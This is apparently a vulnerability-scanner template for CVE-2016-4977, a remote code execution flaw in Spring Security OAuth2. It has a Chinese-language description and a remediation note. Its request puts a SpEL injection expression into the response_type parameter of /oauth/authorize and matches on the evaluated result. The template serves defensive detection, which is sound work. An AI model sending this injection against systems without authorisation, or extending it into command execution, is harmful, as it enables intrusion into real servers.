id: CVE-2016-4977
info:
  name: Spring Security OAuth2 Remote Command Execution
  author:
  - l0ne1y
  description: |-
    Spring Security OAuth2远程代码执行漏洞
    Spring Security OAuth2全套的解决方案来支持在Spring Cloud/Spring Boot环境下使用OAuth2.0，提供了开箱即用的组件。在Spring Security OAuth 2.0.0至2.0.9和1.0.0至1.0.5中使用白标视图处理授权请求时，response_type参数值作为Spring SpEL执行，使恶意用户能够通过制作response_type的值来触发远程代码执行。
  severity: high
  remediation: |-
    #### 官方修复方案：
    升级系统至无漏洞版本，或于官网下载安全补丁。
requests:
- matchers:
  - type: word
    part: body
    words:
    - 'Unsupported response types: [978015547]'
  - type: status
    status:
    - 400
  matchers-condition: and
  path:
  - '{{BaseURL}}/oauth/authorize?response_type=${13337*73331}&client_id=acme&scope=openid&redirect_uri=http://test'
  method: GET
